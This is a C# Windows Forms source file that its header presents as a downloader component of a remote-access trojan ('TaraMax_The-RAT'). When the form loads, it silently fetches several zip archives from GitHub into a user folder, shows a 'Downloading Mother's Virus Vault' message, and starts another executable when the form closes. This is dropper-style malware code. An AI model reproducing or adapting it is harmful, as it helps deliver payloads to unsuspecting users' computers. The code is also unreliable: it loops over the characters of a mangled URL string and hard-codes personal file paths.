//Project Name: "URLHIVE" :: Application Type: Multiple URL Downloader | Zip Compression/Decompression Tool  (Child Process of TaraMax_The-RAT "Dark Crystal Hybrid RAT")
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO.Compression;
using System.IO;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using System.Linq;

namespace URLHIVE
{
    public partial class Form1 : Form
    {

        private readonly Stopwatch stopwatch = new();

        private readonly string url = "https://od.lk/d/MTRfMjYwNzk3ODBf/Bell2SFX.wav" + @"C:\Users\" + Environment.UserName;


        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Application.EnableVisualStyles();

            foreach (var item in url)
            {

                WebClient webClient = new();
                webClient.DownloadFileCompleted += new AsyncCompletedEventHandler(Completed);
                webClient.DownloadProgressChanged += new DownloadProgressChangedEventHandler(ProgressChanged);
                //ADD URL'S TO DOWNLOAD USING ASYNC
                webClient.DownloadFileAsync(new Uri("https://github.com/Blackstarproject/Morrigan/archive/refs/tags/Morrigan.zip"), @"C:\Users\rytho\Videos\Morrigan.zip");

                //string startPath = @"C:\Users\" + Environment.UserName + @"\Documents\your_app.txt";
                //string zipPath = @"c:\example\result.zip";
                //string extractPath = @"C:\Users\" + Environment.UserName + @"\Documents\your_app.txt";
                //string unzip = @"C:\Users\" + Environment.UserName + @"\Desktop\your_app.txt";
                //ZipFile.CreateFromDirectory(startPath, zipPath);
                //ZipFile.ExtractToDirectory(startPath, unzip);

            }
   

            foreach (var item in url)
            {

                WebClient webClient = new();
                webClient.DownloadFileCompleted += new AsyncCompletedEventHandler(Completed);
                webClient.DownloadProgressChanged += new DownloadProgressChangedEventHandler(ProgressChanged);
                //ADD URL'S TO DOWNLOAD USING ASYNC
                webClient.DownloadFileAsync(new Uri("https://github.com/Blackstarproject/Access-Control/archive/refs/tags/AccessControl.zip"), @"C:\Users\rytho\Videos\AccessControl.zip");

                // string startPath = @"C:\Users\" + Environment.UserName + @"\Documents\your_app.txt";
                //string zipPath = @"c:\example\result.zip";
                //string extractPath = @"C:\Users\" + Environment.UserName + @"\Documents\your_app.txt";
                //string unzip = @"C:\Users\" + Environment.UserName + @"\Desktop\your_app.txt";
                // ZipFile.CreateFromDirectory(startPath, zipPath);
                // ZipFile.ExtractToDirectory(startPath, unzip);

            }
    
     
            foreach (var item in url)
            {

                WebClient webClient = new();
                webClient.DownloadFileCompleted += new AsyncCompletedEventHandler(Completed);
                webClient.DownloadProgressChanged += new DownloadProgressChangedEventHandler(ProgressChanged);
                //ADD URL'S TO DOWNLOAD USING ASYNC
                webClient.DownloadFileAsync(new Uri("https://github.com/DeadReport77/Scarlett-Speech-Recognition-Final-Production/releases/download/2.0/Scarlett-Speech-Recognition-Final-Production.zip"), @"C:\Users\rytho\Videos\Scarlett-Speech-Recognition-Final-Production.zip");

                // string startPath = @"C:\Users\" + Environment.UserName + @"\Documents\your_app.txt";
                //string zipPath = @"c:\example\result.zip";
                //string extractPath = @"C:\Users\" + Environment.UserName + @"\Documents\your_app.txt";
                //string unzip = @"C:\Users\" + Environment.UserName + @"\Desktop\your_app.txt";
                // ZipFile.CreateFromDirectory(startPath, zipPath);
                // ZipFile.ExtractToDirectory(startPath, unzip);
          
            }

        }

        private void ProgressChanged(object sender, DownloadProgressChangedEventArgs e)
        {
            try
            {
                // Calculate progress values
                string downloadProgress = e.ProgressPercentage + "% WARNING...";

                string downloadSpeed = string.Format("{0} MB/s", (e.BytesReceived / 1024.0 / 1024.0 / stopwatch.Elapsed.TotalSeconds).ToString("0.00"));

                string downloadedMBs = Math.Round(e.BytesReceived / 1024.0 / 1024.0) + " MB";

                string totalMBs = Math.Round(e.TotalBytesToReceive / 1024.0 / 1024.0) + " MB";

                label1.Text = downloadProgress.ToString();
                // Format progress string
                string progress = $"{downloadedMBs}/{totalMBs} ({downloadProgress}) @ {downloadSpeed}"; // 10 MB / 100 MB (10%) @ 1.23 MB/s

                HOSTBYTES.SelectedIndex = HOSTBYTES.Items.Count - 1;

                HOSTBYTES.SelectedIndex = -1;

                HOSTBYTES.Items.Add(progress + downloadedMBs + downloadProgress + totalMBs + downloadSpeed);

                progressBar1.Increment(1);

                label2.Text = progressBar1.Value + "% Downloading Mother's Virus Vault....";

                progressBar1.Value = e.ProgressPercentage;
            }
            catch (Exception)
            {
                // Debug.WriteLine("Error");
            }
            if (progressBar1.Value >= 100)
            {
               
                progressBar1.Value = progressBar1.Value;
                Thread.Sleep(500);
              
              
                Application.Exit();
            }

        }

        private void Completed(object sender, AsyncCompletedEventArgs e)
        {
            Debug.WriteLine("Download completed!");
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Process.Start("C:\\Users\\rytho\\source\\repos\\Decompression_Sentinal\\Decompression_Sentinal\\bin\\Debug\\Decompression_Sentinal.exe");
        }
    }
}
